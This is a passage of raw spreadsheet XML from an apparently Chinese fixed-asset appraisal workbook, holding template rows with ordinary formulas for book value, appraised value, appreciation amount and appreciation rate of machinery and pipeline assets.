      <c r="D24" s="380" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="380" t="n"/>
      <c r="I24" s="587" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555" t="n"/>
      <c r="M24" s="380" t="n"/>
      <c r="N24" s="555">
        <f>ROUND(L24*M24/100,-2)</f>
        <v/>
      </c>
      <c r="O24" s="555">
        <f>L24-J24</f>
        <v/>
      </c>
      <c r="P24" s="555">
        <f>N24-K24</f>
        <v/>
      </c>
      <c r="Q24" s="555">
        <f>IF(K24=0,"",ROUND(P24/K24*100,2))</f>
        <v/>
      </c>
      <c r="R24" s="211" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="380" t="n"/>
      <c r="I25" s="587" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="380" t="n"/>
      <c r="N25" s="555">
        <f>ROUND(L25*M25/100,-2)</f>
        <v/>
      </c>
      <c r="O25" s="555">
        <f>L25-J25</f>
        <v/>
      </c>
      <c r="P25" s="555">
        <f>N25-K25</f>
        <v/>
      </c>
      <c r="Q25" s="555">
        <f>IF(K25=0,"",ROUND(P25/K25*100,2))</f>
        <v/>
      </c>
      <c r="R25" s="211" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="380" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="380" t="n"/>
      <c r="I26" s="587" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555" t="n"/>
      <c r="M26" s="380" t="n"/>
      <c r="N26" s="555">
        <f>ROUND(L26*M26/100,-2)</f>
        <v/>
      </c>
      <c r="O26" s="555">
        <f>L26-J26</f>
        <v/>
      </c>
      <c r="P26" s="555">
        <f>N26-K26</f>
        <v/>
      </c>
      <c r="Q26" s="555">
        <f>IF(K26=0,"",ROUND(P26/K26*100,2))</f>
        <v/>
      </c>
      <c r="R26" s="211" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="380" t="n"/>
      <c r="I27" s="587" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555" t="n"/>
      <c r="M27" s="380" t="n"/>
      <c r="N27" s="555">
        <f>ROUND(L27*M27/100,-2)</f>
        <v/>
      </c>
      <c r="O27" s="555">
        <f>L27-J27</f>
        <v/>
      </c>
      <c r="P27" s="555">
        <f>N27-K27</f>
        <v/>
      </c>
      <c r="Q27" s="555">
        <f>IF(K27=0,"",ROUND(P27/K27*100,2))</f>
        <v/>
      </c>
      <c r="R27" s="211" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="380" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="380" t="n"/>
      <c r="I28" s="587" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555" t="n"/>
      <c r="M28" s="380" t="n"/>
      <c r="N28" s="555">
        <f>ROUND(L28*M28/100,-2)</f>
        <v/>
      </c>
      <c r="O28" s="555">
        <f>L28-J28</f>
        <v/>
      </c>
      <c r="P28" s="555">
        <f>N28-K28</f>
        <v/>
      </c>
      <c r="Q28" s="555">
        <f>IF(K28=0,"",ROUND(P28/K28*100,2))</f>
        <v/>
      </c>
      <c r="R28" s="211" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="381" t="n"/>
      <c r="D29" s="380" t="n"/>
      <c r="E29" s="380" t="n"/>
      <c r="F29" s="380" t="n"/>
      <c r="G29" s="380" t="n"/>
      <c r="H29" s="380" t="n"/>
      <c r="I29" s="587" t="n"/>
      <c r="J29" s="555" t="n"/>
      <c r="K29" s="555" t="n"/>
      <c r="L29" s="555" t="n"/>
      <c r="M29" s="380" t="n"/>
      <c r="N29" s="555">
        <f>ROUND(L29*M29/100,-2)</f>
        <v/>
      </c>
      <c r="O29" s="555">
        <f>L29-J29</f>
        <v/>
      </c>
      <c r="P29" s="555">
        <f>N29-K29</f>
        <v/>
      </c>
      <c r="Q29" s="555">
        <f>IF(K29=0,"",ROUND(P29/K29*100,2))</f>
        <v/>
      </c>
      <c r="R29" s="211" t="n"/>
    </row>
    <row r="30" ht="16.5" customHeight="1" s="415">
      <c r="A30" s="116" t="n"/>
      <c r="B30" s="380" t="n"/>
      <c r="C30" s="381" t="n"/>
      <c r="D30" s="380" t="n"/>
      <c r="E30" s="380" t="n"/>
      <c r="F30" s="380" t="n"/>
      <c r="G30" s="380" t="n"/>
      <c r="H30" s="380" t="n"/>
      <c r="I30" s="587" t="n"/>
      <c r="J30" s="555" t="n"/>
      <c r="K30" s="555" t="n"/>
      <c r="L30" s="555" t="n"/>
      <c r="M30" s="380" t="n"/>
      <c r="N30" s="555">
        <f>ROUND(L30*M30/100,-2)</f>
        <v/>
      </c>
      <c r="O30" s="555">
        <f>L30-J30</f>
        <v/>
      </c>
      <c r="P30" s="555">
        <f>N30-K30</f>
        <v/>
      </c>
      <c r="Q30" s="555">
        <f>IF(K30=0,"",ROUND(P30/K30*100,2))</f>
        <v/>
      </c>
      <c r="R30" s="211" t="n"/>
    </row>
    <row r="31" ht="16.5" customHeight="1" s="415">
      <c r="A31" s="116" t="n"/>
      <c r="B31" s="380" t="n"/>
      <c r="C31" s="381" t="n"/>
      <c r="D31" s="380" t="n"/>
      <c r="E31" s="380" t="n"/>
      <c r="F31" s="380" t="n"/>
      <c r="G31" s="380" t="n"/>
      <c r="H31" s="380" t="n"/>
      <c r="I31" s="587" t="n"/>
      <c r="J31" s="555" t="n"/>
      <c r="K31" s="555" t="n"/>
      <c r="L31" s="555" t="n"/>
      <c r="M31" s="380" t="n"/>
      <c r="N31" s="555">
        <f>ROUND(L31*M31/100,-2)</f>
        <v/>
      </c>
      <c r="O31" s="555">
        <f>L31-J31</f>
        <v/>
      </c>
      <c r="P31" s="555">
        <f>N31-K31</f>
        <v/>
      </c>
      <c r="Q31" s="555">
        <f>IF(K31=0,"",ROUND(P31/K31*100,2))</f>
        <v/>
      </c>
      <c r="R31" s="211" t="n"/>
    </row>
    <row r="32" ht="18" customHeight="1" s="415">
      <c r="A32" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B32" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C32" s="593" t="n"/>
      <c r="D32" s="567" t="n"/>
      <c r="E32" s="380" t="n"/>
      <c r="F32" s="115" t="n"/>
      <c r="G32" s="115" t="n"/>
      <c r="H32" s="233" t="n"/>
      <c r="I32" s="565" t="inlineStr"/>
      <c r="J32" s="555">
        <f>SUM(J7:J31)</f>
        <v/>
      </c>
      <c r="K32" s="555">
        <f>SUM(K7:K31)</f>
        <v/>
      </c>
      <c r="L32" s="555">
        <f>SUM(L7:L31)</f>
        <v/>
      </c>
      <c r="M32" s="380" t="n"/>
      <c r="N32" s="555">
        <f>SUM(N7:N31)</f>
        <v/>
      </c>
      <c r="O32" s="555">
        <f>L32-J32</f>
        <v/>
      </c>
      <c r="P32" s="555">
        <f>N32-K32</f>
        <v/>
      </c>
      <c r="Q32" s="555">
        <f>IF(K32=0,"",ROUND(P32/K32*100,2))</f>
        <v/>
      </c>
      <c r="R32" s="607" t="n"/>
    </row>
    <row r="33" ht="18" customHeight="1" s="415">
      <c r="A33" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B33" s="284" t="inlineStr">
        <is>
          <t>减：管道和沟槽减值准备</t>
        </is>
      </c>
      <c r="C33" s="593" t="n"/>
      <c r="D33" s="567" t="n"/>
      <c r="E33" s="565" t="n"/>
      <c r="F33" s="565" t="n"/>
      <c r="G33" s="565" t="n"/>
      <c r="H33" s="565" t="n"/>
      <c r="I33" s="565" t="n"/>
      <c r="J33" s="555" t="n"/>
      <c r="K33" s="555" t="n"/>
      <c r="L33" s="555" t="n"/>
      <c r="M33" s="380" t="n"/>
      <c r="N33" s="555" t="n"/>
      <c r="O33" s="555">
        <f>L33-J33</f>
        <v/>
      </c>
      <c r="P33" s="555">
        <f>N33-K33</f>
        <v/>
      </c>
      <c r="Q33" s="555">
        <f>IF(K33=0,"",ROUND(P33/K33*100,2))</f>
        <v/>
      </c>
      <c r="R33" s="211" t="n"/>
    </row>
    <row r="34" ht="18" customHeight="1" s="415">
      <c r="A34" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B34" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C34" s="593" t="n"/>
      <c r="D34" s="567" t="n"/>
      <c r="E34" s="380" t="n"/>
      <c r="F34" s="115" t="n"/>
      <c r="G34" s="115" t="n"/>
      <c r="H34" s="383" t="n"/>
      <c r="I34" s="565" t="n"/>
      <c r="J34" s="555">
        <f>J32-J33</f>
        <v/>
      </c>
      <c r="K34" s="555">
        <f>K32-K33</f>
        <v/>
      </c>
      <c r="L34" s="555">
        <f>L32-L33</f>
        <v/>
      </c>
      <c r="M34" s="380" t="n"/>
      <c r="N34" s="555">
        <f>N32-N33</f>
        <v/>
      </c>
      <c r="O34" s="555">
        <f>L34-J34</f>
        <v/>
      </c>
      <c r="P34" s="555">
        <f>N34-K34</f>
        <v/>
      </c>
      <c r="Q34" s="555">
        <f>IF(K34=0,"",ROUND(P34/K34*100,2))</f>
        <v/>
      </c>
      <c r="R34" s="607" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="19">
    <mergeCell ref="B4:F4"/>
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="Q5:Q6"/>
    <mergeCell ref="J5:K5"/>
    <mergeCell ref="L5:N5"/>
    <mergeCell ref="F5:F6"/>
    <mergeCell ref="B34:D34"/>
    <mergeCell ref="O5:P5"/>
    <mergeCell ref="B2:R2"/>
    <mergeCell ref="I5:I6"/>
    <mergeCell ref="B1:R1"/>
    <mergeCell ref="B33:D33"/>
    <mergeCell ref="G5:G6"/>
    <mergeCell ref="B32:D32"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="H5:H6"/>
    <mergeCell ref="R5:R6"/>
    <mergeCell ref="C5:C6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:R34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3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 codeName="Sheet59">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:S34"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" topLeftCell="A5" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="H12" sqref="H12"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="14.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="6.83333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="11" customWidth="1" style="410" min="4" max="4"/>
    <col width="9" customWidth="1" style="410" min="5" max="6"/>
    <col width="8.83333333333333" customWidth="1" style="410" min="7" max="7"/>
    <col width="5.66666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="7.33333333333333" customWidth="1" style="410" min="9" max="9"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="11" max="12"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col outlineLevel="1" width="7" customWidth="1" style="410" min="14" max="14"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="15" max="17"/>
    <col outlineLevel="1" width="7" customWidth="1" style="410" min="18" max="18"/>
    <col width="7.16666666666667" customWidth="1" style="410" min="19" max="19"/>
    <col width="9" customWidth="1" style="410" min="2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固定资产—机器设备评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="16.5" customFormat="1" customHeight="1" s="148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373" t="n"/>
      <c r="N3" s="373" t="n"/>
      <c r="O3" s="548" t="inlineStr">
        <is>
          <t>表4-8-4</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customFormat="1" customHeight="1" s="148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176" t="n"/>
      <c r="O4" s="176" t="n"/>
      <c r="P4" s="176" t="n"/>
      <c r="Q4" s="176" t="n"/>
      <c r="R4" s="176" t="n"/>
      <c r="S4" s="176">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="215">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头1</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>设备编号</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>设备名称</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>规格型号</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>生产厂家</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>计量单位</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>数量</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>购置日期</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>启用日期</t>
        </is>
      </c>
      <c r="K5" s="188" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="L5" s="567" t="n"/>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="N5" s="593" t="n"/>
      <c r="O5" s="567" t="n"/>
      <c r="P5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="Q5" s="567" t="n"/>
      <c r="R5" s="221" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="S5" s="221" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="215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307" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="L6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="M6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="N6" s="380" t="inlineStr">
        <is>
          <t>成新率%</t>
        </is>
      </c>
      <c r="O6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="P6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="Q6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="R6" s="594" t="n"/>
      <c r="S6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="215">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="380" t="n"/>
      <c r="D7" s="381" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="185" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="380" t="n"/>
      <c r="I7" s="587" t="n"/>
      <c r="J7" s="587" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555" t="n"/>
      <c r="M7" s="555" t="n"/>
      <c r="N7" s="380" t="n"/>
      <c r="O7" s="555">
        <f>ROUND(M7*N7/100,-1)</f>
        <v/>
      </c>
      <c r="P7" s="555">
        <f>M7-K7</f>
        <v/>
      </c>
      <c r="Q7" s="555">
        <f>O7-L7</f>
        <v/>
      </c>
      <c r="R7" s="555">
        <f>IF(L7=0,"",ROUND(Q7/L7*100,2))</f>
        <v/>
      </c>
      <c r="S7" s="223" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="215">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="380" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="380" t="n"/>
      <c r="I8" s="587" t="n"/>
      <c r="J8" s="587" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="555" t="n"/>
      <c r="N8" s="380" t="n"/>
      <c r="O8" s="555">
        <f>ROUND(M8*N8/100,-1)</f>
        <v/>
      </c>
      <c r="P8" s="555">
        <f>M8-K8</f>
        <v/>
      </c>
      <c r="Q8" s="555">
        <f>O8-L8</f>
        <v/>
      </c>
      <c r="R8" s="555">
        <f>IF(L8=0,"",ROUND(Q8/L8*100,2))</f>
        <v/>
      </c>
      <c r="S8" s="223" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="215">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="380" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="380" t="n"/>
      <c r="I9" s="587" t="n"/>
      <c r="J9" s="587" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="555" t="n"/>
      <c r="N9" s="380" t="n"/>
      <c r="O9" s="555">
        <f>ROUND(M9*N9/100,-1)</f>
        <v/>
      </c>
      <c r="P9" s="555">
        <f>M9-K9</f>
        <v/>
      </c>
      <c r="Q9" s="555">
        <f>O9-L9</f>
        <v/>
      </c>
      <c r="R9" s="555">
        <f>IF(L9=0,"",ROUND(Q9/L9*100,2))</f>
        <v/>
      </c>
      <c r="S9" s="223" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="215">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="380" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="380" t="n"/>
      <c r="I10" s="587" t="n"/>
      <c r="J10" s="587" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="555" t="n"/>
      <c r="N10" s="380" t="n"/>
      <c r="O10" s="555">
        <f>ROUND(M10*N10/100,-1)</f>
        <v/>
      </c>
      <c r="P10" s="555">
        <f>M10-K10</f>
        <v/>
      </c>
      <c r="Q10" s="555">
        <f>O10-L10</f>
        <v/>
      </c>
      <c r="R10" s="555">
        <f>IF(L10=0,"",ROUND(Q10/L10*100,2))</f>
        <v/>
      </c>
      <c r="S10" s="223" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="215">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="380" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="380" t="n"/>
      <c r="I11" s="587" t="n"/>
      <c r="J11" s="587" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="555" t="n"/>
      <c r="N11" s="380" t="n"/>
      <c r="O11" s="555">
        <f>ROUND(M11*N11/100,-1)</f>
        <v/>
      </c>
      <c r="P11" s="555">
        <f>M11-K11</f>
        <v/>
      </c>
      <c r="Q11" s="555">
        <f>O11-L11</f>
        <v/>
      </c>
      <c r="R11" s="555">
        <f>IF(L11=0,"",ROUND(Q11/L11*100,2))</f>
        <v/>
      </c>
      <c r="S11" s="223" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="215">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="380" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="380" t="n"/>
      <c r="I12" s="587" t="n"/>
      <c r="J12" s="587" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="555" t="n"/>
      <c r="N12" s="380" t="n"/>
      <c r="O12" s="555">
        <f>ROUND(M12*N12/100,-1)</f>
        <v/>
      </c>
      <c r="P12" s="555">
        <f>M12-K12</f>
        <v/>
      </c>
      <c r="Q12" s="555">
        <f>O12-L12</f>
        <v/>
      </c>
      <c r="R12" s="555">
        <f>IF(L12=0,"",ROUND(Q12/L12*100,2))</f>
        <v/>
      </c>
      <c r="S12" s="223" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="215">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="380" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="185" t="n"/>
      <c r="H13" s="380" t="n"/>
      <c r="I13" s="587" t="n"/>
      <c r="J13" s="587" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="555" t="n"/>
      <c r="N13" s="380" t="n"/>
      <c r="O13" s="555">
        <f>ROUND(M13*N13/100,-1)</f>
        <v/>
      </c>
      <c r="P13" s="555">
        <f>M13-K13</f>
        <v/>
      </c>
      <c r="Q13" s="555">
        <f>O13-L13</f>
        <v/>
      </c>
      <c r="R13" s="555">
        <f>IF(L13=0,"",ROUND(Q13/L13*100,2))</f>
        <v/>
      </c>
      <c r="S13" s="223" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="215">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="380" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="380" t="n"/>
      <c r="I14" s="587" t="n"/>
      <c r="J14" s="587" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="555" t="n"/>
      <c r="N14" s="380" t="n"/>
      <c r="O14" s="555">
        <f>ROUND(M14*N14/100,-1)</f>
        <v/>
      </c>
      <c r="P14" s="555">
        <f>M14-K14</f>
        <v/>
      </c>
      <c r="Q14" s="555">
        <f>O14-L14</f>
        <v/>
      </c>
      <c r="R14" s="555">
        <f>IF(L14=0,"",ROUND(Q14/L14*100,2))</f>
        <v/>
      </c>
      <c r="S14" s="223" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="381" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="380" t="n"/>
      <c r="I15" s="587" t="n"/>
      <c r="J15" s="587" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="555" t="n"/>
      <c r="N15" s="380" t="n"/>
      <c r="O15" s="555">
        <f>ROUND(M15*N15/100,-1)</f>
        <v/>
      </c>
      <c r="P15" s="555">
        <f>M15-K15</f>
        <v/>
      </c>
      <c r="Q15" s="555">
        <f>O15-L15</f>
        <v/>
      </c>
      <c r="R15" s="555">
        <f>IF(L15=0,"",ROUND(Q15/L15*100,2))</f>
        <v/>
      </c>
      <c r="S15" s="227" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="381" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="380" t="n"/>
      <c r="I16" s="587" t="n"/>
      <c r="J16" s="587" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="555" t="n"/>
      <c r="N16" s="380" t="n"/>
      <c r="O16" s="555">
        <f>ROUND(M16*N16/100,-1)</f>
        <v/>
      </c>
      <c r="P16" s="555">
        <f>M16-K16</f>
        <v/>
      </c>
      <c r="Q16" s="555">
        <f>O16-L16</f>
        <v/>
      </c>
      <c r="R16" s="555">
        <f>IF(L16=0,"",ROUND(Q16/L16*100,2))</f>
        <v/>
      </c>
      <c r="S16" s="227" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="381" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="380" t="n"/>
      <c r="I17" s="587" t="n"/>
      <c r="J17" s="587" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="555" t="n"/>
      <c r="N17" s="380" t="n"/>
      <c r="O17" s="555">
        <f>ROUND(M17*N17/100,-1)</f>
        <v/>
      </c>
      <c r="P17" s="555">
        <f>M17-K17</f>
        <v/>
      </c>
      <c r="Q17" s="555">
        <f>O17-L17</f>
        <v/>
      </c>
      <c r="R17" s="555">
        <f>IF(L17=0,"",ROUND(Q17/L17*100,2))</f>
        <v/>
      </c>
      <c r="S17" s="227" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="381" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="380" t="n"/>
      <c r="I18" s="587" t="n"/>
      <c r="J18" s="587" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="555" t="n"/>
      <c r="N18" s="380" t="n"/>
      <c r="O18" s="555">
        <f>ROUND(M18*N18/100,-1)</f>
        <v/>
      </c>
      <c r="P18" s="555">
        <f>M18-K18</f>
        <v/>
      </c>
      <c r="Q18" s="555">
        <f>O18-L18</f>
        <v/>
      </c>
      <c r="R18" s="555">
        <f>IF(L18=0,"",ROUND(Q18/L18*100,2))</f>
        <v/>
      </c>
      <c r="S18" s="227" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="381" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="380" t="n"/>
      <c r="I19" s="587" t="n"/>
      <c r="J19" s="587" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="555" t="n"/>
      <c r="N19" s="380" t="n"/>
      <c r="O19" s="555">
        <f>ROUND(M19*N19/100,-1)</f>
        <v/>
      </c>
      <c r="P19" s="555">
        <f>M19-K19</f>
        <v/>
      </c>
      <c r="Q19" s="555">
        <f>O19-L19</f>
        <v/>
      </c>
      <c r="R19" s="555">
        <f>IF(L19=0,"",ROUND(Q19/L19*100,2))</f>
        <v/>
      </c>
      <c r="S19" s="227" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="148">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="381" t="n"/>
